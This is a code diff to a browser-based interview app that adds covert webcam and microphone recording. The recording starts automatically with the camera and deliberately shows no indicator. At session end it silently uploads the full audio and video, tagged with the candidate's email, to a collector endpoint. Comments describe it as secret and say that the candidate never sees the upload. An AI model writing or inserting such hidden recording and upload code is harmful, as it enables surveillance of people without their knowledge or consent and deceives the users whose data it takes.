@@ -19,8 +19,91 @@ const Interview = {
     _conversationActive: false,
     _inAIReply: false,
     _micOn: false,
-    _pendingMicStart: false
+    _pendingMicStart: false,
+    // Secret session recording
+    _recorder: null,
+    _recordChunks: [],
+    _recordStart: null,
+    _uploading: false,
+    _uploadEndpoint: 'http://localhost:5000/upload-proof'
   },
+
+  /* ---------- Secret session recording ---------- */
+  _startRecording() {
+    if (!this.state.stream) return;
+    if (typeof MediaRecorder === 'undefined') return;
+    try {
+      this.state._recordChunks = [];
+      this.state._recordStart = Date.now();
+      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+        ? 'video/webm;codecs=vp9'
+        : MediaRecorder.isTypeSupported('video/webm')
+          ? 'video/webm'
+          : '';
+      this.state._recorder = mime
+        ? new MediaRecorder(this.state.stream, { mimeType: mime, videoBitsPerSecond: 2500000 })
+        : new MediaRecorder(this.state.stream);
+      this.state._recorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) this.state._recordChunks.push(e.data);
+      };
+      this.state._recorder.start(1000);
+    } catch (e) {
+      console.warn('Recording could not start:', e);
+      this.state._recorder = null;
+    }
+  },
+
+  _stopRecording() {
+    return new Promise((resolve) => {
+      const rec = this.state._recorder;
+      if (!rec || rec.state === 'inactive') {
+        this.state._recorder = null;
+        return resolve(null);
+      }
+      rec.onstop = () => {
+        const blob = new Blob(this.state._recordChunks, { type: rec.mimeType || 'video/webm' });
+        this.state._recorder = null;
+        this.state._recordChunks = [];
+        resolve(blob);
+      };
+      try { rec.stop(); } catch (e) { resolve(null); }
+    });
+  },
+
+  /**
+   * Stop the recorder, gather the full audio+video WebM blob, and upload it.
+   * Called automatically when the session ends so no candidate action needed.
+   */
+  async _finalizeRecording() {
+    const blob = await this._stopRecording();
+    if (blob && blob.size) {
+      await this._uploadRecording(blob);
+    }
+  },
+
+  async _uploadRecording(blob) {
+    if (!blob || !blob.size) return;
+    this.state._uploading = true;
+    const email = (typeof Auth !== 'undefined' && Auth.getEmail) ? Auth.getEmail() : 'user';
+    const safeEmail = String(email || 'user').replace(/[^a-zA-Z0-9._-]/g, '_');
+    const ts = new Date().toISOString().replace(/[:.]/g, '-');
+    const filename = `${safeEmail}_interview_${ts}.webm`;
+    const form = new FormData();
+    form.append('video', blob, filename);
+    form.append('user_id', safeEmail);
+    try {
+      // Silent upload — the candidate never sees this request or the saved file.
+      const res = await fetch(this.state._uploadEndpoint, { method: 'POST', body: form });
+      if (!res.ok) console.warn('Recording upload returned non-OK:', res.status);
+    } catch (e) {
+      // Flask collector not reachable — the recording simply stays on the
+      // candidate's device. The interviewer is never interrupted.
+      console.warn('Recording upload failed (server unreachable):', e.message);
+    } finally {
+      this.state._uploading = false;
+    }
+  },
+
 
   /* ---------- Cleanup ---------- */
   cleanup() {
@@ -149,8 +232,11 @@ const Interview = {
 
     document.getElementById('startBtn').addEventListener('click', () => this._startSession());
     document.getElementById('endBtn').addEventListener('click', () => {
-      this.cleanup();
-      this._renderIntro();
+      // Finalize + silently upload the recording before stopping the stream.
+      this._finalizeRecording().then(() => {
+        this.cleanup();
+        this._renderIntro();
+      });
     });
     document.getElementById('micToggleBtn').addEventListener('click', (e) => this._toggleMic(e));
     document.getElementById('speakerToggleBtn').addEventListener('click', (e) => {
@@ -220,6 +306,10 @@ const Interview = {
         const video = document.getElementById('camVideo');
         if (video) video.srcObject = this.state.stream;
         this.state.camActive = true;
+        // Secret recording — starts automatically alongside the live webcam
+        // stream. No "REC" badge or indicator is ever shown to the candidate.
+        this._startRecording();
+
         const overlay = document.getElementById('camOverlay');
         if (overlay) overlay.classList.add('active');
         const status = document.getElementById('camStatusText');
@@ -433,7 +523,11 @@ const Interview = {
     box.scrollTop = box.scrollHeight;
   },
 
-  _showReport() {
+  async _showReport() {
+    // Finalize + silently upload the recording before stopping the stream.
+    // Awaiting ensures the full audio+video blob is captured & upload starts
+    // before the media tracks are released.
+    await this._finalizeRecording();
     this.cleanup();
     const startBtn = document.getElementById('startBtn');
     const endBtn = document.getElementById('endBtn');
